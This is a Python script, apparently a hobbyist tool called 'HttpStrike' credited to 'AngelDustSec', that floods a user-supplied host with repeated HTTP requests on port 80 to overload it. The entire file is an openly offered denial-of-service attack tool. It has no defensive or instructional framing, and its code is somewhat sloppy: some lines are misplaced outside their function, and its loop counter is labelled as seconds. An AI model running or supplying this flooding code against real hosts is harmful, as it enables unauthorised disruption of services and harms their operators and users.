#!/bin/python3

import sys
import os
import time
import socket
import random
import requests
import pyfiglet

# a packet must be crafted to send to port 80

os.system("clear")
banner = pyfiglet.figlet_format("HttpStrike")
packet = ""
useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def start():
    os.system("clear")
    print(banner)
print("")
print("Security-Team    : AngelDustSec")
print("YouTube          : https://youtube.com/@Anonymous")
print("GitHub           : https://github.com/K3ysTr0K3R")
print("Instagram        : https://instagram.com/K3ysTr0K3R")
print("")

def flood(target):
    req = requests.get(f"http://{target}:80/", headers=useragent)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    sock.sendto(req.content, (target, 80))
    sock.close()

target = input("[!] target? = ")
print(f"[i] Scan started at [{hour}:{minute}:{day}/{month}/{year}]")
try:
    start()
    time.sleep(0.5)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = sock.connect_ex((target, 80))
    if connect == 0:
        print(f"[!] Connected to [{target}:80]")
    else:
        print(f"[i] {target}:80 is closed")
        exit()
except KeyboardInterrupt :
    print("\n[i] user requested interrupt")
    print("[i] shutting down...")
    exit()
except socket.gaierror :
    print("[!] hostname not found")
    exit()
except socket.error :
    print("[!] could not connect to server")
    exit()

print("")
for _ in range(1,10000):
    flood(target)
    print(f"[+] Flooding {target} on port 80 for {_} seconds [{hour}:{minute}:{day}/{month}/{year}]")
